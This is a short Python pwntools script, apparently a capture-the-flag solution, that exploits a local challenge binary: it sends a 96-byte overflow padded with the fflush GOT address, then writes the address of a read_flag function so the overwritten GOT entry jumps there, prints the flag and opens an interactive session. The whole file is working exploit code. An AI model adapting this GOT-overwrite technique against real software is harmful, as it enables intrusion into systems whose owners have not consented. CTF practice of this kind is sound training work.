#! /usr/bin/python3
from pwn import *

ROOT = os.path.abspath(os.path.dirname(__file__))
target_path = os.path.abspath(os.path.join(ROOT, "../docker/target"))
e = ELF(target_path)

if "REMOTE" in os.environ:
  if not "PORT" in os.environ:
      print("Need to specify the port number")
      exit(1)
  p = remote("localhost", int(os.environ["PORT"]))
else:
  p = process(e.path)

fflush_got = e.got['fflush']
readflag_addr = e.symbols['read_flag']

payload = b''
payload += b'A'*96
payload += p32(fflush_got)
p.sendline(payload)

payload = str(int(readflag_addr))
p.sendline(payload)
p.recvuntil('enter password : ')
print(p.recvline())
p.interactive()
